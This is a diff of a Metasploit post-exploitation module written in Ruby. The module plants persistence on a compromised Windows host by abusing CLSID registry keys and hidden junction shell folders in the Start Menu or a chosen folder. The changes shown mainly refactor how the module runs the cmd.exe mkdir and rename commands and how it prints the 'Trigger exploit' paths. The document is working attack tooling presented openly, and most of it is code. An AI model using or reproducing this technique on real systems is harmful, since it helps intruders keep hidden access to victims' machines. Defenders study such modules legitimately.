@@ -202,6 +202,8 @@ def run
 
 
   # variable declarations ..
+  r=''
+  hacks = []
   app_path = datastore['APPL_PATH']   # %windir%\\System32\\calc.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\%username%\Desktop\POC
   hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
@@ -238,7 +240,7 @@ def run
     end
 
     #
-    # check if file exists (APPL_PATH)
+    # check if file/appl exists remote (APPL_PATH)
     #
     print_status("check if APPL exists in target ..")
     if session.fs.file.exist?(app_path)
@@ -295,8 +297,9 @@ def run
      end
 
 
-       r=''
+       #
        # loop funtion to execute a list of reg keys ..
+       #
        session.response_timeout=120
        hacks.each do |cmd|
           begin
@@ -317,32 +320,25 @@ def run
          #
          # build POC folder (junction shell folders)
          #
-         r=''
          if datastore['PERSIST_EXPLORER'] == true
-           folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC\""
+           folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
            print_status("Creating junction shell folder ..")
            Rex::sleep(1.0)
-           r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
-           r.channel.close
-           r.close
+           cmd_exec("cmd.exe /R mkdir \"#{folder_poc}.#{new_GUID}\"")
          elsif datastore['RENAME_PERSIST'] == true
-           ren_per = "\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\""
+           ren_per = "#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories"
            print_status("Creating junction shell folder ..")
            Rex::sleep(1.0)
-        r = session.sys.process.execute("cmd.exe /R rename #{ren_per} #{ren_per}.{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
-           r.channel.close
-           r.close
+           cmd_exec("cmd.exe /R rename \"#{ren_per} #{ren_per}.{new_GUID}\"")
          else
            print_status("Creating junction shell folder ..")
            Rex::sleep(1.0)
-           r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
-           r.channel.close
-           r.close
+           cmd_exec("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"")
          end
 
 
          #
-         # create cleaner resource file
+         # create cleaner resource file [local PC]
          #
          print_status("Writing cleaner resource file ..")
          Rex::sleep(1.0)
@@ -357,13 +353,13 @@ def run
        # exploit finished (print info on screen)..
        #
        print_good("Module execution finished ..")
+       Rex::sleep(1.0)
        if datastore['PERSIST_EXPLORER'] == true
          print_line("    -------------------------------------------------------")
          print_line("    Trigger exploit: #{folder_poc}")
          print_line("")
          print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
          print_line("    -------------------------------------------------------")
-         Rex::sleep(1.0)
        elsif datastore['RENAME_PERSIST'] == true
          print_line("    -------------------------------------------------------")
          print_line("    Trigger exploit: #{ren_per}")
@@ -371,14 +367,12 @@ def run
          print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
          print_line("    Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
          print_line("    -------------------------------------------------------")
-         Rex::sleep(1.0)
        else
          print_line("    -------------------------------------------------------")
          print_line("    Trigger exploit: #{fol_path}")
          print_line("")
          print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
          print_line("    -------------------------------------------------------")
-         Rex::sleep(1.0)
        end
 
 
